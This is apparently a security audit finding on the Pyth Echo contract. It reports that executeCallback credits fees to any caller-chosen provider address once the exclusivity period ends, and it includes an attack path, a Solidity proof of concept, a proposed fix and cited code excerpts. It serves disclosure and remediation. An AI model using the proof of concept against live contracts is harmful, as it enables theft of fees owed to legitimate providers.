### Title
Unvalidated `providerToCredit` in `Echo.executeCallback` Allows Fee Theft After Exclusivity Period - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

### Summary

`Echo.executeCallback` accepts a caller-supplied `providerToCredit` address and credits the full request fee to `_state.providers[providerToCredit].accruedFeesInWei` with no validation that this address is the originally assigned provider — or even a registered provider — once the exclusivity period expires. Any unprivileged actor who registers as a provider can wait 15 seconds after a request's `publishTime`, call `executeCallback` with their own address as `providerToCredit`, and drain the fee that was paid to the legitimate provider.

### Finding Description

When a user calls `requestPriceUpdatesWithCallback`, the fee they pay (minus the Pyth protocol fee) is stored in `req.fee` and `req.provider` records the assigned provider. [1](#0-0) 

When `executeCallback` is called, the exclusivity check only enforces that `providerToCredit == req.provider` during the exclusivity window: [2](#0-1) 

After the exclusivity period, there is no constraint on `providerToCredit`. The fee is unconditionally credited to whatever address the caller supplies: [3](#0-2) 

There is no check that `providerToCredit` is a registered provider, nor that it matches `req.provider`. The `ProviderInfo` mapping is a plain `mapping(address => ProviderInfo)` that silently initializes to zero for any address: [4](#0-3) 

**Attack path:**

1. Attacker calls `echo.registerProvider(0, 0, 0)` — permissionless, no cost.
2. Attacker calls `echo.setFeeManager(attackerAddress)` — sets themselves as fee manager of their own provider entry.
3. Attacker monitors the chain for any unfulfilled request whose `block.timestamp >= req.publishTime + exclusivityPeriodSeconds` (default: 15 seconds).
4. Attacker fetches valid Pyth price update data from the public Hermes API.
5. Attacker calls `echo.executeCallback(attackerAddress, sequenceNumber, updateData, priceIds)`.
6. `req.fee` (the fee paid by the user to the legitimate provider) is credited to `_state.providers[attackerAddress].accruedFeesInWei`.
7. Attacker calls `echo.withdrawAsFeeManager(attackerAddress, stolenAmount)` to extract the ETH. [5](#0-4) 

The legitimate provider receives nothing despite having been assigned the request and having set their fee accordingly.

### Impact Explanation

Every unfulfilled Echo request older than 15 seconds is vulnerable. The attacker steals the full provider fee (`req.fee = msg.value - pythFeeInWei`) from each such request. For requests with large `callbackGasLimit` values, this fee can be substantial (provider fee scales as `baseFee + feedCount * feePerFeed + gasLimit * feePerGas`). [6](#0-5) 

The user's callback is still delivered (the attacker must supply valid price data), so users are not directly harmed, but the legitimate provider loses all fee revenue from any request they fail to fulfill within 15 seconds — including requests they may be in the process of fulfilling.

### Likelihood Explanation

The exclusivity period is 15 seconds by default. [7](#0-6) 

Valid Pyth price update data is publicly available from Hermes with no authentication. Any EOA can register as a provider (no stake, no cost). The attack requires no privileged access, no leaked keys, and no governance majority. A bot monitoring the chain can systematically steal fees from every request that the legitimate provider does not fulfill within the exclusivity window.

### Recommendation

After the exclusivity period, validate that `providerToCredit` is a registered provider, and consider restricting it to `req.provider` or a whitelist of registered providers:

```diff
function executeCallback(
    address providerToCredit,
    uint64 sequenceNumber,
    bytes[] calldata updateData,
    bytes32[] calldata priceIds
) external payable override {
    Request storage req = findActiveRequest(sequenceNumber);

    if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
        require(providerToCredit == req.provider, "Only assigned provider during exclusivity period");
+   } else {
+       require(_state.providers[providerToCredit].isRegistered, "providerToCredit must be a registered provider");
    }
    ...
}
```

A stricter fix would always credit `req.provider` and only allow a different registered provider to claim a penalty share, preventing any address from redirecting fees entirely.

### Proof of Concept

```solidity
// 1. Attacker registers and sets themselves as fee manager
echo.registerProvider(0, 0, 0);
echo.setFeeManager(attackerAddress);

// 2. Legitimate user makes a request to defaultProvider
uint64 seq = echo.requestPriceUpdatesWithCallback{value: fee}(
    defaultProvider, block.timestamp, priceIds, callbackGasLimit
);

// 3. Wait for exclusivity period (15 seconds)
vm.warp(block.timestamp + 16);

// 4. Attacker fulfills with themselves as providerToCredit
echo.executeCallback(attackerAddress, seq, updateData, priceIds);

// 5. Attacker withdraws stolen fees
uint128 stolen = echo.getProviderInfo(attackerAddress).accruedFeesInWei;
echo.withdrawAsFeeManager(attackerAddress, stolen);
// attackerAddress now holds the fee that should have gone to defaultProvider
``` [8](#0-7)

    function executeCallback(
        address providerToCredit,
        uint64 sequenceNumber,
        bytes[] calldata updateData,
        bytes32[] calldata priceIds
    ) external payable override {
        Request storage req = findActiveRequest(sequenceNumber);

        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }

        // Verify priceIds match
        require(
            priceIds.length == req.priceIdPrefixes.length,
            "Price IDs length mismatch"
        );
        for (uint8 i = 0; i < req.priceIdPrefixes.length; i++) {
            // Extract first 8 bytes of the provided price ID
            bytes32 priceId = priceIds[i];
            bytes8 prefix;
            assembly {
                prefix := priceId
            }

            // Compare with stored prefix
            if (prefix != req.priceIdPrefixes[i]) {
                // Now we can directly use the bytes8 prefix in the error
                revert InvalidPriceIds(priceIds[i], req.priceIdPrefixes[i]);
            }
        }

        // TODO: should this use parsePriceFeedUpdatesUnique? also, do we need to add 1 to maxPublishTime?
        IPyth pyth = IPyth(_state.pyth);
        uint256 pythFee = pyth.getUpdateFee(updateData);
        PythStructs.PriceFeed[] memory priceFeeds = pyth.parsePriceFeedUpdates{
            value: pythFee
        }(
            updateData,
            priceIds,
            SafeCast.toUint64(req.publishTime),
            SafeCast.toUint64(req.publishTime)
        );

        // TODO: if this effect occurs here, we need to guarantee that executeCallback can never revert.
        // If executeCallback can revert, then funds can be permanently locked in the contract.
        // TODO: there also needs to be some penalty mechanism in case the expected provider doesn't execute the callback.
        // This should take funds from the expected provider and give to providerToCredit. The penalty should probably scale
        // with time in order to ensure that the callback eventually gets executed.
        // (There may be exploits with ^ though if the consumer contract is malicious ?)
        _state.providers[providerToCredit].accruedFeesInWei += SafeCast
            .toUint128((req.fee + msg.value) - pythFee);

        bytes32[] calldata priceIds
    ) public view override returns (uint96 feeAmount) {
        uint96 baseFee = _state.pythFeeInWei; // Fixed fee to Pyth
        // Note: The provider needs to set its fees to include the fee charged by the Pyth contract.
        // Ideally, we would be able to automatically compute the pyth fees from the priceIds, but the
        // fee computation on IPyth assumes it has the full updated data.
        uint96 providerBaseFee = _state.providers[provider].baseFeeInWei;
        uint96 providerFeedFee = SafeCast.toUint96(
            priceIds.length * _state.providers[provider].feePerFeedInWei
        );
        uint96 providerFeeInWei = _state.providers[provider].feePerGasInWei; // Provider's per-gas rate
        uint256 gasFee = callbackGasLimit * providerFeeInWei; // Total provider fee based on gas
        feeAmount =
            baseFee +
            providerBaseFee +
            providerFeedFee +
            SafeCast.toUint96(gasFee); // Total fee user needs to pay
